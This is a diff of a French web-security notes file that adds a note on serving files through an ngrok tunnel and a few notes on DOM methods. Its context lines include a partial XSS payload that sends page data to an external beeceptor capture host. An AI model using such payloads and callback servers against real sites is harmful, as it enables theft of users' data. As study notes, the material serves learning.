@@ -12,6 +12,17 @@
 
 - [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)
 
+### Serveur web - Ngrok
+
+```
+ngrok tcp 8000 #éviter http
+python -m http.server 8000 #dossier adéquat
+```
+
+Accéder 
+
+`http://X.tcp.eu.ngrok.io:port`
+
 ## Extensions
 
 ### Firefox
@@ -132,7 +143,23 @@ https://excess-xss.com/
 
 ![](./url.png)
 
+### DOM - notions
+
+[https://www.w3schools.com/js/js_htmldom.asp](dom.gif)
+
+- `document.getElementById`
+
+- `document.innerHTML`
+
+Voir aussi `elements`
+
+
+`Hash (#)`
+
+- https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_loc_hash
+
 ### XSS
+
  - https://beta.hackndo.com/attaque-xss/
  - https://excess-xss.com/
  - https://learn-cyber.net/article/Self-XSS-Attacks
@@ -160,7 +187,6 @@ https://vulnerable.org?parameter=<img src="//night.free.beeceptor.com?data=".con
 -> appel ou accès aux éléments du DOM (ex document.getElementByID)
 
 [CSP Bypass](https://csplite.com/csp320/)
-
 
 ### HTTP Smuggling
 
